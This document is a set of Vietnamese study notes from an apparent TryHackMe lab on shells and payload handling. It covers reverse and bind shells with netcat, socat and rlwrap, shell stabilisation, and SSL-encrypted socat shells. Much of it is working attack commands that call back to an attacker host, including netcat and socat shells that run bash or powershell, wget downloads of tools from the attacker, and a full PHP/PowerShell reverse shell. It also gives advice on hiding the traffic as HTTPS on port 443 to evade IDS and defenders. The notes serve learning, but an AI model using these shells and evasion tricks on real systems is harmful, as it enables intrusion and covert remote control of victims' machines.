# 1) Tổng hợp
```js
Shells & Payload Handling
│
├── 1. Hướng kết nối
│   ├── Reverse Shell
│   │   ├── Nạn nhân gọi về attacker
│   │   ├── Ít bị chặn (outbound thường mở)
│   │   └── Dùng nhiều nhất
│   └── Bind Shell
│       ├── Nạn nhân mở cổng, attacker gọi vào
│       ├── Hay bị firewall chặn
│       └── Dùng khi outbound bị chặn
│
├── 2. Công cụ tạo shell
│   ├── Netcat (nc)
│   │   ├── Cờ: -l -v -n -p
│   │   ├── -e để exec shell
│   │   └── Nhẹ, nhanh, có sẵn
│   ├── Ncat
│   │   ├── Hỗ trợ SSL/TLS, proxy, IPv6
│   │   └── Bản mới của Nmap
│   └── Socat
│       ├── TCP-L / TCP
│       ├── EXEC để chạy shell
│       ├── Hỗ trợ PTY, SSL, file, pipe
│       └── Mạnh nhưng không có sẵn
│
├── 3. Ổn định shell
│   ├── Python pty
│   │   ├── pty.spawn("/bin/bash")
│   │   ├── export TERM=xterm
│   │   ├── stty raw -echo (attacker)
│   │   └── stty rows/cols
│   ├── rlwrap
│   │   ├── rlwrap nc -lvnp 4444
│   │   └── Thêm history, tab, arrow keys
│   └── Socat TTY
│       ├── pty, stderr, sigint, setsid, sane
│       └── Shell như SSH thật
│
├── 4. Mã hóa shell (Socat SSL)
│   ├── Tạo cert
│   │   ├── openssl req -newkey rsa:2048 -nodes
│   │   ├── -x509 -days 365
│   │   └── cat key + crt > pem
│   ├── Reverse SSL
│   │   ├── Attacker: OPENSSL-LISTEN:443
│   │   └── Target: OPENSSL:IP:443 EXEC
│   ├── Bind SSL
│   │   ├── Target: OPENSSL-LISTEN:8443
│   │   └── Attacker: OPENSSL:IP:8443
│   └── Encrypted TTY
│       └── Kết hợp SSL + full TTY
│
└── 5. Lưu ý thực tế
    ├── Port 443/8443 để giả HTTPS
    ├── Cert điền info giống thật
    ├── verify=0 khi dùng self-signed
    └── Check socat -V để xem OpenSSL
```

# II) reverse shell và bin shell
 **reverse shell** và **bind shell**.

### 1- Khái niệm:
**Reverse shell (shell ngược):**  
- Máy **nạn nhân** (target) chủ động **kết nối về** máy tấn công (attacker).  
- Mày mở listener trên máy mình, nạn nhân gọi về.  
- Vì **outbound** (ra ngoài) thường ít bị chặn hơn **inbound** (vào trong), nên reverse shell phổ biến nhất.  

**Ví dụ:**
- Attacker chạy listener:
  ```bash
  nc -lvnp 4444
  ```
- Trên máy nạn nhân chạy:
  ```bash
  nc <IP_attacker> 4444 -e /bin/bash
  ```
- Mày nhận được shell trên listener.


> [!NOTE] Title
> ok cái này học trong phần nc rồi, mình cũng đã được làm quen ở room metáploit trước đó 

**Bind shell (shell gắn cổng):**  
- Máy **nạn nhân** tự **mở cổng lắng nghe**, mày (attacker) chủ động **kết nối tới**.  
- Thường bị tường lửa của nạn nhân chặn, nên ít dùng hơn.

**Ví dụ:**
- Trên máy nạn nhân:
  ```bash
  nc -lvnp 8080 -e /bin/bash
  ```
- Từ máy tấn công:
  ```bash
  nc <IP_nạn_nhân> 8080
  ```
- Có shell ngay.
### 2- Khi nào dùng loại nào:

- **Reverse shell** nên dùng khi:
  - Nạn nhân có thể ra ngoài (outbound) – hầu hết trường hợp.
  - Tường lửa chặn inbound vào nạn nhân.
  - Nạn nhân sau NAT, không có port forward.
  - Mày muốn kiểm soát cổng trên máy mình.

- **Bind shell** nên dùng khi:
  - Outbound từ nạn nhân bị chặn.
  - Mày không thể mở listener trên máy mình.
  - Cổng trên nạn nhân mở qua firewall.
  - Nhiều người cùng muốn vào shell.

> [!NOTE]
> ### 📌 Tóm gọn:
> - **Reverse shell** = nạn nhân gọi về mày → dễ xài, phổ biến.
> - **Bind shell** = mày gọi vào nạn nhân → ít dùng vì hay bị chặn.
> - và mình phải xem nó là out bount hay inbound để chọn loại shell thích hợp
> - thằng nào bị kết nối tới sẽ là thằng lắng nghe


# III) tool để remote shell
### 1- Công cụ shell cơ bản
**Netcat (nc)**  
- Chức năng: nghe hoặc kết nối TCP, chuyển dữ liệu thô.  
- Ưu: nhẹ, có sẵn mọi nơi, cài nhanh.  
- Nhược: không mã hóa, không lịch sử lệnh, kém tương tác.  
- Dùng khi: cần shell nhanh, thử kết nối, chuyển file.

**rlwrap**  
- Bọc netcat, thêm lịch sử, phím mũi tên, tab.  
- Dùng khi: làm việc lâu với shell netcat.
*=> có vẻ nó xịn hơn do có lịch sử,mũi tên,...*
**socat**  
- Nâng cấp netcat: có **PTY** (giả terminal), hỗ trợ SSL/TLS, ổn định hơn.  
- Dùng khi: cần shell tương tác đầy đủ, mã hóa, chạy chương trình phức tạp.  
- Nhược: không phải lúc nào cũng cài sẵn trên mục tiêu.

**msfvenom + multi/handler**  
- Tạo payload đa nền tảng, bắt shell kiểu Meterpreter.  
- Ưu: mạnh, có module post-exploitation, quản lý nhiều session.  
- Nhược: phức tạp, tốn tài nguyên.

> [!NOTE] Title
> đại khái là có 4 cái công cụ trên
> - netcat
> - msfvenom + multi/handler ==> 2 cái trên mình đã học
> 
> còn lại 2 cái mình chưa học
> - socat
> - rlwrap

### 2- Cách kết hợp
- Bắt đầu bằng **netcat** → kiểm tra shell hoạt động.  
- Thêm **rlwrap** → dễ thao tác hơn.  
- Chuyển sang **socat** → cần ổn định, mã hóa.  
- Cuối cùng **Metasploit** → hậu khai thác chuyên sâu.

> [!NOTE] Title
> ok , đây là cách kết hợp mấy thằng bên trên

# IV) Cách sử dụng netcat
**1- Netcat để làm gì?**  
Netcat (nc) là công cụ truyền dữ liệu qua mạng TCP/UDP, thường dùng để bắt shell (reverse/bind), chuyển file, hoặc test kết nối. Nó có sẵn trên hầu hết Linux.

**2- Nghe (listener) trên máy mình để chờ shell gọi về:**  
```bash
nc -lvnp 4444
```
Giải thích cờ:
- `-l` (listen) – nghe kết nối đến.
- `-v` (verbose) – hiện thông tin kết nối.
- `-n` (numeric) – không phân giải DNS.
- `-p` (port) – chỉ định cổng.

Thường dùng port >1024 (như **4444**) để khỏi cần root.

**3- Reverse shell: nạn nhân gọi về mình.**  
Trên máy mình (attacker): mở listener `nc -lvnp 4444`.  
Trên máy nạn nhân (target):  
```bash
nc <IP_attacker> 4444 -e /bin/bash
```
`-e` (execute) chạy shell và nối với kết nối. Nếu netcat không có `-e`, phải dùng cách khác (ống dẫn, python...).


> [!NOTE] Title
> OK mình chỉ cần nhớ 2 thằng này thôi

**4- Bind shell: nạn nhân mở cổng, mình gọi vào.**  
Trên target:  
```bash
nc -lvnp 8080 -e /bin/bash
```
Trên attacker:  
```bash
nc <IP_target> 8080
```
<u>Bind shell hay bị firewall chặn vì inbound vào target, nên reverse phổ biến hơn.</u>

**5- Netcat vs Ncat:**  
- `nc` – bản cũ, nhẹ, đơn giản.
- `ncat` – bản mới từ Nmap, hỗ trợ SSL/TLS, proxy, IPv6 tốt hơn.

**6- Một số cờ khác:**
- `-u` (UDP) – ít dùng cho shell vì không ổn định.
- `-w` (wait) – đặt thời gian chờ.
- `-q` (quit) – sau khi stdin đóng, chờ vài giây rồi thoát.

Ví dụ thực tế: mày thấy web server có lỗi upload file, ném lên cái shell.php rồi bắt reverse bằng `nc -lvnp 4444` trên máy mình. Đó là cách chiếm shell nhanh nhất.

# V) Cách dùng Socat
**1- Socat là gì?**  
<u>Giống netcat nhưng mạnh hơn, hỗ trợ PTY (giả terminal), SSL, và nhiều tính năng khác.</u> Shell tạo ra **ổn định hơn** netcat. Tuy nhiên, socat thường không có sẵn trên máy nạn nhân, phải tự cài hoặc chuyển file binary vào.
> [!NOTE] Title
> đại khái là socat xịn hơn, nhưng thường không có sẵn trên máy taget như netcat, nên là sau khi gửi payload lên target thì mình cần tải cái socat này về

**2- Reverse shell cơ bản với socat:**  
- Trên máy tấn công (mở listener):
  ```
  socat TCP-L:443 -
  ```
  Giải thích: TCP-L (listen) cổng 443, **dấu gạch ngang là hiển thị lên terminal.**

- Trên máy target (kết nối về):
  ```
  socat TCP:IP_attacker:443 EXEC:"bash -li"
  ```
  Giải thích: TCP:IP:port để kết nối tới, EXEC để chạy bash.

**3- Windows reverse shell với socat:**  
  ``` bash
  socat TCP:IP_attacker:443 EXEC:powershell.exe,pipes
  ```
  Giải thích: `pipes` để xử lý named pipe cho đúng, thay vì bash thì dùng powershell hoặc cmd.


**4- Bind shell với socat:**  
- Trên nạn nhân (mở cổng chờ):
  ```
  socat TCP-L:8088 EXEC:"bash -li"
  ```
- Trên máy tấn công (kết nối tới):
  ```
  socat TCP:IP_target:8088 -
  ```
- Trên Windows: dùng `EXEC:cmd.exe,pipes`.

> [!NOTE] CHỐT LẠI
> -L :listen , - là shell , EXEC : bash hoặc powershell.exe


**5- Khi nào dùng socat?**  
Khi cần shell ổn định, có tương tác đầy đủ (Ctrl+C, job control), hoặc muốn mã hóa SSL. Còn netcat chỉ dùng cho nhanh gọn, thử nghiệm.

Ví dụ thực tế: Bạn đã có shell netcat nhưng lệnh hay bị treo, không dùng được Ctrl+C. Lúc đó ném socat lên máy nạn nhân, tạo reverse shell mới, sẽ thoải mái hơn nhiều.


# VI) Cách để ổn định shell bằng pty , lrwrap hay socat
**1- Vì sao cần ổn định shell?**  
Shell netcat thường thiếu arrow keys, tab completion, Ctrl+C dễ làm rớt. Chạy mấy lệnh như `ssh`, `vim` không được. Nên phải nâng cấp.

**2- Cách dùng Python pty:**  
- Mở listener: `nc -lvnp 4444`.  
- Trên target: `nc <IP_attacker> 4444 -e /bin/bash`.  
- Trên shell target: `python3 -c 'import pty; pty.spawn("/bin/bash")'`  
- Gõ `export TERM=xterm` cho chuẩn.  
- Trên attacker: nhấn `Ctrl+Z`, gõ `stty raw -echo`, rồi `fg`.  
- Trên target: `stty rows <rows> cols <cols>` (lấy kích thước bằng `stty size` trên attacker trước).  
- Khi thoát: `stty sane` trên attacker.

Ví dụ: mày có reverse shell, gõ `vim` bị treo. Dùng **pty** là vim chạy ngon.
![[Pasted image 20260909210154.png|507]]
**3- Cách dùng rlwrap:**  
- Cài rlwrap: `sudo apt install rlwrap`.  
- Mở listener: `rlwrap nc -lvnp 4444`.  
- Vẫn kết hợp python pty như trên.  
- Giờ có thêm lịch sử lệnh, tab completion.
![[Pasted image 20260909210400.png|517]]

> [!NOTE] Title
> tức là chạy cái http server kia giúp tải cái rlwrap trên con máy target

**4- Cách dùng socat cho shell full TTY:**  
- Nếu target chưa có socat, tải qua HTTP: mở `sudo python3 -m http.server 80` trên attacker, rồi trên target: `wget http://IP_attacker/socat -O /tmp/socat && chmod +x /tmp/socat`.  
- Trên attacker: `socat TCP-L:5555 FILE:`tty`,raw,echo=0`  
- Trên target: `/tmp/socat TCP:IP_attacker:5555 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`  
- Kết quả shell như SSH thật.
![[Pasted image 20260909210438.png]]
> [!NOTE] Title
> Đ hiểu cái j

Thực tế: khi cần chạy nhiều lệnh, Ctrl+C, background job, socat là lựa chọn tốt nhất.

# VII) mã hóa shell
**1- Tại sao cần mã hóa shell?**  
Shell thường (netcat) gửi hết dữ liệu dạng plaintext → ai đó sniff được, IDS/DLP phát hiện, port lạ như 4444 dễ bị nghi. Mã hóa SSL/TLS làm traffic giống HTTPS thật, trên port 443/8443 thì càng giống.

> [!NOTE] Title
> đại khái là shell thường nó ko mã hóa--> cần socat

**2- Tạo cert với openssl (chạy trên attacker):**
-atacker:
```bash
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem
```
Giải thích cờ:
- `-newkey rsa:2048` – tạo key RSA 2048-bit.
- `-nodes` – không đặt passphrase cho key.
- `-x509` – xuất cert tự ký thay vì CSR.
- `-keyout` / `-out` – file key và cert.
- `-days 365` – hạn 1 năm.

> [!NOTE] Title
> => đại khái là thằng này chỉ tạo cert cho openssl thôi

**3- Reverse shell mã hóa:**  
Attacker mở listener:
```bash
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -
```
*=> thằng này dùng socat với cái shell.pem đã tạo bên trên*
Target kết nối về:
```bash
socat OPENSSL:IP_attacker:443,verify=0 EXEC:/bin/bash
```
Windows:
```
C:\> socat OPENSSL:IP_attacker:443,verify=0 EXEC:powershell.exe,pipes
```

**4- Bind shell mã hóa:**  
Target mở listener:
```bash
socat OPENSSL-LISTEN:8443,cert=/tmp/shell.pem,verify=0 EXEC:"bash -li"
```
Attacker kết nối tới:
```bash
socat OPENSSL:IP_target:8443,verify=0 -
```
Trước đó phải chuyển shell.pem sang target:
```bash
# attacker
sudo python3 -m http.server 80

# target
wget http://IP_attacker/shell.pem -O /tmp/shell.pem
```
Windows bind shell:
```powershell
Invoke-WebRequest -Uri http://IP_attacker/shell.pem -OutFile C:\Windows\Temp\shell.pem
socat OPENSSL-LISTEN:8443,cert=C:\Windows\Temp\shell.pem,verify=0 EXEC:cmd.exe,pipes
```

**5- Encrypted TTY shell (vừa mã hóa vừa full TTY):**  
Attacker:
```bash
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
```
Target:
```bash
socat OPENSSL:IP_attacker:443,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
Giải thích nhanh cờ bên target:
- `pty` – cấp pseudo-terminal.
- `stderr` – gộp lỗi vào output.
- `sigint` – bắt Ctrl+C.
- `setsid` – tạo session riêng để job control.
- `sane` – thiết lập terminal chuẩn.

**6- Lưu ý khi xài:**
- Port 443/8443/9443 an toàn nhất, đừng dùng port lạ.
- Cert nên điền thông tin giống tổ chức thật.
- Nếu lỗi, check `socat -V` xem có OpenSSL không.
- File cert phải đọc được, nên dùng đường dẫn tuyệt đối.
- Lỗi "certificate verify failed" → cả 2 đầu phải `verify=0`.

Thực tế: Khi pentest trong môi trường có DLP/IDS, dùng socat SSL trên port 443 để shell nhìn như HTTPS. Vừa qua mắt defender, vừa có full TTY.

> [!NOTE] Chốt lại dễ hiểu
> 1- Shell thường giống như mày nói chuyện với nạn nhân bằng **tiếng Việt bình thường**. Ai đi ngang qua cũng nghe được mày nói gì. Ví dụ mày bảo "đưa tao file mật khẩu", thằng quản lý mạng (IDS/DLP) nghe thấy hết, nó chặn ngay.
> 
> 2- Shell mã hóa giống như mày và nạn nhân nói **tiếng lóng riêng của hai đứa**. Người ngoài nghe thấy toàn chữ vô nghĩa, không hiểu gì. Mày bảo "đưa tao file mật khẩu" thì nó thành "đưa tao cái abcxyz", người ngoài chịu.
> 
> 3- Làm sao để có "tiếng lóng riêng"? Hai đứa phải có **cuốn từ điển chung** (certificate). Mày tạo cuốn từ điển đó bằng openssl. Xong đưa cho nạn nhân một bản, mày giữ một bản. Khi nói chuyện, cả hai dùng cuốn đó để dịch qua lại.
> 
> 4- Khi mày mở listener, mày bảo socat "tao nói chuyện bằng tiếng lóng, dùng cuốn từ điển shell.pem này, và **không cần kiểm tra** xem đứa bên kia có đúng người không (verify=0)". Nạn nhân cũng làm y chang vậy, hai đứa nói chuyện được.
> 
> 5- Vì sao phải chọn port 443? Vì port đó dành cho HTTPS (web bảo mật). Người quản lý mạng thấy traffic trên port 443 thì nghĩ "à, web bảo mật bình thường", không nghi ngờ. Nếu mày dùng port 4444 thì ai cũng biết là netcat, dễ bị chặn.
> 
> 6- Ví dụ thực tế:  
> Mày vào được máy nạn nhân bằng shell netcat thường. Mày muốn chạy mấy lệnh nhạy cảm mà sợ bị bắt. Mày tải socat lên máy đó, tạo kết nối SSL về máy mình trên port 443. Giờ mày với nạn nhân "nói tiếng lóng", defender nhìn vào chỉ thấy HTTPS bình thường. Mày cứ thoải mái chạy lệnh.
> 
> 7- Full TTY mã hóa là gì?  
> Giống như mày không chỉ nói tiếng lóng mà còn **dùng đúng ngữ pháp, đúng cảm xúc** (pty, sigint, setsid). Nghĩa là mày dùng được Ctrl+C, chạy vim, ssh, tab completion như ngồi trước máy thật. Vừa bảo mật vừa tiện.
> 
> Vậy thôi, đơn giản là: shell thường = nói to, ai cũng nghe. Shell mã hóa = nói tiếng lóng, chỉ hai đứa hiểu.

# VIII) thực hành 
![[Pasted image 20260911161256.png]]2- Kết nối RDP vào Windows bằng lệnh có sẵn:
```bash
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:Administrator /p:'TryH4ckM3!'
```
3- Trên AttackBox, mở listener (netcat hoặc socat) để chờ shell gọi về.  
4- Trên Windows, tạo file reverse shell (thường là `.php` hoặc `.aspx` vì có XAMPP) trỏ về IP của mày.  
```php
<?php
// reverse shell đơn giản dùng PowerShell
$ip = 'ATTACKER_IP';      // IP máy AttackBox của mày
$port = ATTACKER_PORT;    // cổng mày mở listener (ví dụ 4444)

$cmd = "powershell -c \"\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\"";
system($cmd);
?>
```

5- Upload file shell đó vào thư mục web của XAMPP (thường là `C:\xampp\htdocs\`). 
![[Pasted image 20260911162541.png]]
6- Mở trình duyệt trên Windows, truy cập file shell qua `http://localhost/tên_file.php` để kích hoạt.  
![[Pasted image 20260911163150.png]]
7- Quay lại AttackBox, mày sẽ nhận được shell.
![[Pasted image 20260911163131.png]]